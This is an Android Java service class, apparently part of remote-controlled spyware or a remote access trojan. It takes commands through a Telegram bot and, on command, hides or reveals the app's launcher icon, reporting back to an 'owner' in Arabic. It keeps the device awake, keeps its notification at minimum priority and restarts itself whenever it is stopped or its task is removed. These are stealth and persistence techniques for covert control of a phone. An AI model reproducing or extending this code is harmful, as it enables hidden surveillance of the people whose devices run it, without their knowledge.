package com.alzahra.service;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.alzahra.App;
import com.alzahra.MainActivity;
import com.alzahra.R;
import com.alzahra.bot.TelegramBot;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CoreService extends Service {
    private static final String TAG = "CoreService";
    private static final int NOTIFICATION_ID = 1001;

    private TelegramBot bot;
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;
    private SharedPreferences prefs;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== CoreService Created ===");

        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        mainHandler = new Handler(Looper.getMainLooper());

        acquireWakeLock();
        startForegroundNotification();
        startBot();
        startAutoSync();
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlZahra::CoreWakeLock");
                wakeLock.acquire(24 * 60 * 60 * 1000L);
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock error", e);
        }
    }

    private void startForegroundNotification() {
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            Notification notification = new NotificationCompat.Builder(this, App.CHANNEL_ID)
                .setContentTitle(getString(R.string.service_running))
                .setContentText(getString(R.string.service_description))
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build();

            startForeground(NOTIFICATION_ID, notification);
        } catch (Exception e) {
            Log.e(TAG, "Notification error", e);
        }
    }

    private void startBot() {
        bot = new TelegramBot(this);
        bot.setCommandListener(command -> {
            Log.d(TAG, "Command received: " + command);
            switch (command) {
                case "CMD_HIDE":
                    hideApp(true);
                    break;
                case "CMD_UNHIDE":
                    hideApp(false);
                    break;
            }
        });
        bot.start();
    }

    private void startAutoSync() {
        scheduler = Executors.newScheduledThreadPool(2);

        // Keep-alive check every 60 seconds
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (bot != null && !bot.isRunning()) {
                    Log.w(TAG, "Bot not running, restarting...");
                    if (bot != null) bot.stop();
                    startBot();
                }
            } catch (Exception e) {
                Log.e(TAG, "Keep-alive error", e);
            }
        }, 60, 60, TimeUnit.SECONDS);

        // Update sync time every minute
        scheduler.scheduleAtFixedRate(() -> {
            prefs.edit().putLong("last_sync", System.currentTimeMillis()).apply();
        }, 1, 1, TimeUnit.MINUTES);
    }

    private void hideApp(boolean hide) {
        try {
            prefs.edit().putBoolean("app_hidden", hide).apply();

            if (hide) {
                // Hide from launcher
                PackageManager pm = getPackageManager();
                ComponentName component = new ComponentName(this, MainActivity.class);
                pm.setComponentEnabledSetting(component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

                if (bot != null) {
                    bot.sendToOwner("🔒 تم إخفاء التطبيق من القائمة");
                }
            } else {
                // Show in launcher
                PackageManager pm = getPackageManager();
                ComponentName component = new ComponentName(this, MainActivity.class);
                pm.setComponentEnabledSetting(component,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

                if (bot != null) {
                    bot.sendToOwner("🔓 تم إظهار التطبيق في القائمة");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Hide app error", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - restarting");
        try {
            Intent restartIntent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Restart error", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "=== CoreService Destroyed ===");

        try {
            if (scheduler != null) scheduler.shutdownNow();
            if (bot != null) bot.stop();
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        } catch (Exception e) {
            Log.e(TAG, "Destroy error", e);
        }

        // Self-restart
        try {
            Intent restartIntent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Self-restart error", e);
        }
    }
}
